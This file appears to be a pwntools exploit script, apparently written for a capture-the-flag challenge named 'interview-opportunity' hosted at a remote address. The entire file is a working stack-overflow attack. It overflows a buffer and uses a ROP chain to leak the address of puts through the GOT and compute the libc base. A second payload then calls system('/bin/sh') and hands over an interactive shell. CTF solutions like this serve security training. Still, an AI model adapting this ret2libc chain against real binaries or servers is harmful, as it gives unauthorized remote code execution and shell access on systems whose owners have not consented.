#!/usr/bin/python2

from pwn import *

elf = context.binary = ELF('./interview-opportunity')
libc = ELF('libc.so.6')
# p = process('./interview-opportunity')
p = remote('mc.ax',31081)

padding = 0x22
rdi = 0x0000000000401313
ret_add = 0x000000000040101a

payload = flat(
    'A'*padding,
    rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main'],
)
p.recvline()
p.sendlineafter('\n',payload)
p.recvline()
p.recvline()
# print(asw[:-3])
leak = u64(p.recvline()[:-1].ljust(8,'\x00'))
print(hex(leak))
libc.address = leak - libc.sym['puts']
print(hex(libc.address))
payload = flat(
    'A' * padding,
    rdi,
    next(libc.search('/bin/sh\x00')),
    ret_add, #ret
    libc.sym['system'],
    # libc.sym['exit']
)
p.sendline(payload)
p.interactive()